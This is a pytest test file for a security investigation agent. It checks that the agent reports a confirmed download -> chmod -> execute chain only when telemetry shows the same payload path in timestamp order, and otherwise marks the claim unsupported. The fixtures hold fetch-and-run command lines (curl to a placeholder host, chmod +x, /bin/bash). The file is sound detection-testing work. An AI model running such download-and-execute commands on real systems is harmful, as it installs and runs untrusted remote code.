import importlib.util
import json
from pathlib import Path

import pytest
from jsonschema import Draft202012Validator

INVESTIGATION_PATH = Path("agents/investigation-agent/src/main.py")
INVESTIGATION_SCHEMA_PATH = Path("schemas/investigation_result_schema.json")


def load_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def load_investigation():
    spec = importlib.util.spec_from_file_location(
        "investigation_fallback_evidence_bounded",
        INVESTIGATION_PATH,
    )
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def incident(timeline: list[dict]) -> dict:
    return {
        "incident_id": "inc-fallback-001",
        "severity": "low",
        "matched_rules": [],
        "timeline": timeline,
        "host": "host-01",
    }


def triage_result() -> dict:
    return {
        "triage_id": "triage-inc-fallback-001",
        "incident_id": "inc-fallback-001",
        "attack_id": None,
        "verdict": "benign",
        "confidence": "low",
        "priority": "P3",
        "risk_score": 10,
        "summary": "No additional triage evidence.",
        "attack_story": [],
        "key_observations": [],
        "derived_features": {
            "download_and_execute_chain": False,
            "high_risk_execution_flow": False,
            "external_payload_source": False,
        },
        "derived_features_extra": [],
        "mitre_attack": [],
        "recommended_actions": [],
    }


def timeline_event(timestamp: str, command_line: str) -> dict:
    return {
        "timestamp": timestamp,
        "host": "host-01",
        "command_line": command_line,
    }


def endpoint_event(
    timestamp: str | None,
    command_line: str | None = None,
    argv: list[str] | None = None,
) -> dict:
    event = {
        "event_id": f"endpoint-{timestamp}",
        "source": "auditd",
        "platform": "linux",
        "host": "host-01",
        "event_type": "process_exec",
    }
    if timestamp is not None:
        event["timestamp"] = timestamp
    if command_line is not None:
        event["command_line"] = command_line
    if argv is not None:
        event["argv"] = argv
    return event


def endpoint_envelope(events: list[dict]) -> dict:
    return {
        "schema_version": "endpoint_events.v1",
        "generated_at": "2026-07-31T00:00:00Z",
        "source_artifact": "endpoint_events.json",
        "events": events,
    }


def build_result(timeline: list[dict], endpoint_events: object = None) -> dict:
    investigation = load_investigation()
    result = investigation.build_investigation_result(
        incident=incident(timeline),
        triage_result=triage_result(),
        endpoint_events=endpoint_events,
    )
    Draft202012Validator(load_json(INVESTIGATION_SCHEMA_PATH)).validate(result)
    return result


def combined_text(result: dict) -> str:
    return " ".join(
        [
            result["summary"],
            result["attack_story"],
            *result["recommended_next_steps"],
            *(pivot["reason"] for pivot in result["recommended_pivots"]),
        ]
    ).lower()


def assert_full_chain_unestablished(result: dict) -> None:
    assert "confirmed a download -> chmod -> execute chain" not in result["summary"].lower()
    assert "does not establish the full" in result["summary"].lower()
    assert (
        "download, permission change, and execution sequence" not in result["attack_story"].lower()
    )
    assert any(
        "download -> chmod -> execute" in claim["claim"] for claim in result["unsupported_claims"]
    )
    assert (
        "review the downloaded payload and preserve a copy"
        not in " ".join(result["recommended_next_steps"]).lower()
    )
    assert (
        "validate the ordered endpoint chain"
        not in " ".join(pivot["reason"] for pivot in result["recommended_pivots"]).lower()
    )


def test_no_evidence_fallback_does_not_presuppose_a_process_chain() -> None:
    result = build_result([])

    assert result["evidence_level"] == "none"
    assert result["evidence_summary"]["observed_facts"] == [
        "No concrete process or authentication facts were extracted."
    ]
    assert "does not establish" in result["summary"].lower()
    assert "no concrete defender-side process evidence" in result["attack_story"].lower()

    text = combined_text(result)
    for unsupported_presupposition in (
        "investigation confirmed a download -> chmod -> execute chain",
        "available process evidence",
        "review the downloaded payload",
        "observed command execution",
        "process-chain hit",
    ):
        assert unsupported_presupposition not in text

    assert any("determine whether" in step.lower() for step in result["recommended_next_steps"])
    assert all(pivot["source_artifact"] == "incident" for pivot in result["recommended_pivots"])
    chain_claim = next(
        claim
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )
    assert "download" in chain_claim["reason"]
    assert "permission change" in chain_claim["reason"]
    assert "execution" in chain_claim["reason"]

    assert {
        "verdict",
        "severity",
        "confidence",
        "priority",
        "risk_score",
        "approval",
    }.isdisjoint(result)


@pytest.mark.parametrize(
    "command_line",
    [
        'powershell.exe -NoProfile -Command "Write-Output fixture-ok"',
        "powershell.exe -NoProfile -EncodedCommand SAFE_PLACEHOLDER_NOT_EXECUTABLE",
    ],
)
def test_atomic_powershell_observation_is_not_process_chain_evidence(
    command_line: str,
) -> None:
    result = build_result(
        [
            timeline_event(
                "2026-01-15T01:02:03Z",
                command_line,
            )
        ]
    )

    assert result["evidence_level"] == "none"
    assert "does not establish" in result["summary"].lower()
    assert "confirmed a download -> chmod -> execute" not in result["summary"].lower()
    assert "available process evidence" not in result["attack_story"].lower()
    assert result["evidence"]["download_events"] == []
    assert result["evidence"]["chmod_events"] == []
    assert result["evidence"]["execution_events"] == []


def test_full_chain_evidence_keeps_the_stronger_narrative() -> None:
    payload_path = "/tmp/evidence-bounded-payload.sh"
    result = build_result(
        [
            timeline_event(
                "2026-07-31T00:00:01Z",
                f"curl -fsS -o {payload_path} https://example.invalid/payload.sh",
            ),
            timeline_event(
                "2026-07-31T00:00:02Z",
                f"chmod +x {payload_path}",
            ),
            timeline_event(
                "2026-07-31T00:00:03Z",
                f"/bin/bash {payload_path}",
            ),
        ]
    )

    assert result["evidence_level"] == "moderate"
    assert "confirmed a download -> chmod -> execute chain" in result["summary"].lower()
    assert "available process evidence" in result["attack_story"].lower()
    assert "download, permission change, and execution sequence" in result["attack_story"].lower()
    assert result["evidence"]["payload_path"] == payload_path
    assert result["evidence"]["execution_path"] == payload_path
    assert not any(
        "download -> chmod -> execute" in claim["claim"] for claim in result["unsupported_claims"]
    )


def test_different_payload_paths_are_not_promoted_to_a_full_chain() -> None:
    result = build_result(
        [
            timeline_event(
                "2026-07-31T00:00:01Z",
                "curl -fsS -o /tmp/downloaded-a.sh https://example.invalid/a.sh",
            ),
            timeline_event(
                "2026-07-31T00:00:02Z",
                "chmod +x /tmp/permission-b.sh",
            ),
            timeline_event(
                "2026-07-31T00:00:03Z",
                "/bin/bash /tmp/executed-c.sh",
            ),
        ]
    )

    assert result["evidence_level"] == "moderate"
    assert "confirmed a download -> chmod -> execute chain" not in result["summary"].lower()
    assert "does not establish the full" in result["summary"].lower()
    chain_claim = next(
        claim
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )
    assert "ordered same-payload-path correlation" in chain_claim["reason"]


def test_same_path_with_identical_timestamps_is_not_an_ordered_chain() -> None:
    payload_path = "/tmp/same-timestamp.sh"
    timestamp = "2026-07-31T00:00:01Z"
    result = build_result(
        [
            timeline_event(
                timestamp,
                f"curl -fsS -o {payload_path} https://example.invalid/payload.sh",
            ),
            timeline_event(timestamp, f"chmod +x {payload_path}"),
            timeline_event(timestamp, f"/bin/bash {payload_path}"),
        ]
    )

    assert result["evidence_level"] == "moderate"
    assert_full_chain_unestablished(result)
    observed_facts = " ".join(result["evidence_summary"]["observed_facts"]).lower()
    assert payload_path in observed_facts
    assert "permission-change command(s) observed" in observed_facts
    chain_claim = next(
        claim
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )
    assert "ordered same-payload-path correlation" in chain_claim["reason"]


def test_url_path_is_not_treated_as_the_local_download_output() -> None:
    local_output = "/tmp/actual-output.sh"
    url_path = "/tmp/unrelated.sh"
    result = build_result(
        [
            timeline_event(
                "2026-07-31T00:00:01Z",
                f"curl -o {local_output} https://example.invalid{url_path}",
            ),
            timeline_event("2026-07-31T00:00:02Z", f"chmod +x {url_path}"),
            timeline_event("2026-07-31T00:00:03Z", f"/bin/bash {url_path}"),
        ]
    )

    assert result["evidence"]["payload_path"] == local_output
    assert url_path not in result["evidence"]["payload_paths_observed"]
    assert result["evidence"]["execution_path"] == url_path
    assert_full_chain_unestablished(result)
    assert any(
        "ordered same-payload-path correlation" in claim["reason"]
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )


def test_endpoint_argv_only_full_chain_is_recognized() -> None:
    payload_path = "/tmp/argv-only.sh"
    result = build_result(
        [],
        endpoint_envelope(
            [
                endpoint_event(
                    "2026-07-31T00:00:01Z",
                    argv=[
                        "curl",
                        "-fsS",
                        "-o",
                        payload_path,
                        "https://example.invalid/payload.sh",
                    ],
                ),
                endpoint_event(
                    "2026-07-31T00:00:02Z",
                    argv=["chmod", "+x", payload_path],
                ),
                endpoint_event(
                    "2026-07-31T00:00:03Z",
                    argv=["/bin/bash", payload_path],
                ),
            ]
        ),
    )

    assert "confirmed a download -> chmod -> execute chain" in result["summary"].lower()
    assert "download, permission change, and execution sequence" in result["attack_story"].lower()
    assert not any(
        "download -> chmod -> execute" in claim["claim"] for claim in result["unsupported_claims"]
    )
    assert (
        "review the downloaded payload and preserve a copy"
        in " ".join(result["recommended_next_steps"]).lower()
    )
    assert (
        "validate the ordered endpoint chain"
        in " ".join(pivot["reason"] for pivot in result["recommended_pivots"]).lower()
    )
    observed_facts = " ".join(result["evidence_summary"]["observed_facts"]).lower()
    assert "endpoint telemetry observed command execution" in observed_facts
    assert payload_path in observed_facts


@pytest.mark.parametrize("missing_timestamp_stage", [None, "download"])
def test_reversed_or_missing_timestamps_do_not_use_input_order(
    missing_timestamp_stage: str | None,
) -> None:
    payload_path = "/tmp/unordered.sh"
    timestamps = {
        "download": "2026-07-31T00:00:03Z",
        "chmod": "2026-07-31T00:00:02Z",
        "execution": "2026-07-31T00:00:01Z",
    }
    if missing_timestamp_stage is not None:
        timestamps[missing_timestamp_stage] = None
    result = build_result(
        [
            {
                "host": "host-01",
                "command_line": (f"curl -fsS -o {payload_path} https://example.invalid/payload.sh"),
                **(
                    {"timestamp": timestamps["download"]}
                    if timestamps["download"] is not None
                    else {}
                ),
            },
            timeline_event(timestamps["chmod"], f"chmod +x {payload_path}"),
            timeline_event(timestamps["execution"], f"/bin/bash {payload_path}"),
        ]
    )

    assert_full_chain_unestablished(result)
    assert any(
        "ordered same-payload-path correlation" in claim["reason"]
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )


def test_endpoint_chmod_and_execution_do_not_imply_download_or_full_chain() -> None:
    payload_path = "/tmp/endpoint-partial.sh"
    result = build_result(
        [],
        endpoint_envelope(
            [
                endpoint_event(
                    "2026-07-31T00:00:01Z",
                    f"chmod +x {payload_path}",
                ),
                endpoint_event(
                    "2026-07-31T00:00:02Z",
                    f"/bin/bash {payload_path}",
                ),
            ]
        ),
    )

    assert "endpoint_chmod_execute_chain_observed" in result["enriched_features"]
    assert "endpoint_url_fetch_observed" not in result["enriched_features"]
    assert "confirmed a download -> chmod -> execute chain" not in result["summary"].lower()
    assert "does not establish the full" in result["summary"].lower()

    chain_claim = next(
        claim
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )
    assert "download" in chain_claim["reason"].lower()

    pivot_text = " ".join(
        pivot["reason"] for pivot in [*result["missing_pivots"], *result["recommended_pivots"]]
    ).lower()
    assert "observed a payload download" not in pivot_text
    assert "observed a payload download, permission change, and execution chain" not in pivot_text
    assert "without download" in pivot_text or "correlate download" in pivot_text


def test_download_only_evidence_is_not_promoted_to_a_full_chain() -> None:
    payload_path = "/tmp/download-only-payload.sh"
    result = build_result(
        [
            timeline_event(
                "2026-07-31T00:00:01Z",
                f"curl -fsS -o {payload_path} https://example.invalid/payload.sh",
            )
        ]
    )

    assert result["evidence_level"] == "limited"
    assert "limited process-chain evidence" in result["summary"].lower()
    assert "download" in result["summary"].lower()
    assert "does not establish the full" in result["summary"].lower()
    assert "supports only these process-chain elements: download" in result["attack_story"].lower()
    assert result["evidence"]["payload_path"] == payload_path
    assert result["evidence"]["execution_path"] is None
    assert "observed command execution" not in combined_text(result)

    chain_claim = next(
        claim
        for claim in result["unsupported_claims"]
        if "download -> chmod -> execute" in claim["claim"]
    )
    assert "permission change" in chain_claim["reason"]
    assert "execution" in chain_claim["reason"]
    assert "download." not in chain_claim["reason"].lower()


def test_permission_change_path_is_not_treated_as_download_or_execution() -> None:
    target_path = "/tmp/chmod-only-target.sh"
    result = build_result(
        [
            timeline_event(
                "2026-07-31T00:00:01Z",
                f"chmod +x {target_path}",
            )
        ]
    )

    assert result["evidence_level"] == "limited"
    assert "permission change" in result["summary"].lower()
    assert "download, execution" not in result["summary"].lower()
    assert result["evidence"]["payload_path"] is None
    assert result["evidence"]["execution_path"] is None
    assert "executed path" not in result["attack_story"].lower()
    observed_facts = " ".join(result["evidence_summary"]["observed_facts"]).lower()
    assert "permission-change command(s) observed" in observed_facts
    assert "chmod +x /tmp/chmod-only-target.sh" in observed_facts
    assert "no concrete process or authentication facts" not in observed_facts
